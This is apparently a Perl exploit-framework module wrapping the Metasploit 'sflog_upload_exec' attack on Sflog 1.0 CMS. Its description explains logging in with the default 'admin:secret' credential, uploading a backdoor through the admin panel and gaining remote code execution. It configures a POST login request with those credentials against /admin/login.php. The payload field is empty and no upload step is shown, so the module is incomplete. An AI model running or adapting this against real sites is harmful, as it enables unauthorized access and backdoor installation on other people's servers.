package SFLOG::MSF::SflogUploadExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "SflogUploadExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  "DESCRIPTION" => "

        This module exploits multiple design flaws in Sflog 1.0.  By default, the CMS has

        a default admin credential of \"admin:secret\", which can be abused to access

        administrative features such as blogs management.  Through the management

        interface, we can upload a backdoor that's accessible by any remote user, and then

        gain arbitrary code execution.

      ",
  "METHOD" => "POST",
  "MSF_MODULE" => "sflog_upload_exec",
  "OSVDB" => 83767,
  "PATH" => "__BASE__/admin/login.php?",
  "PATHS" => [
    "__BASE__/admin/login.php",
    "__BASE__/admin/manage.php",
    "sflog/",
  ],
  "PAYLOAD" => "",
  "THE USERTITLE TO LOGIN WITH" => "admin",
  VARIABLES => {
    'BASE' =>       { DESCRIPTION => "", VALUE => "" },
    'PASSWORD' =>       { DESCRIPTION => "The password to login with", VALUE => "secret" },
    'USERID' =>       { DESCRIPTION => "", VALUE => "" },
    'USERNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'RHOST' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       { DESCRIPTION => "The base directory to sflog!", VALUE => "/sflog/" },
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'admin/login.php',
      PAYLOAD      => 'userID=__USERNAME__&password=__PASSWORD__',
      TEXT   => 'Sending Exploit #1 Request : [POST] /admin/login.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
